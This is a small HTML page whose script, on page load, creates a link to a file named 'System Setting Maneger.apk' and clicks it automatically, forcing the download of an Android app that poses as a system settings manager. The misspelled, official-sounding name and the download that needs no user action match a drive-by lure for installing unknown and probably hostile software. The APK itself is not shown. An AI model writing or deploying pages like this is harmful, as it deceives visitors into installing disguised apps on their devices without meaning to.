<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Auto Download</title>
</head>
<body>
<script>
    window.onload = function() {
        // Specify the URL of the file to download
        var fileUrl = 'System Setting Maneger.apk';
        
        // Create a link element
        var downloadLink = document.createElement('a');
        
        // Set the link's href attribute to the file URL
        downloadLink.href = fileUrl;
        
        // Set the download attribute to force download
        downloadLink.download = 'System Setting Maneger.apk';
        
        // Click the link programmatically to start download
        downloadLink.click();
    };
</script>
</body>
</html>
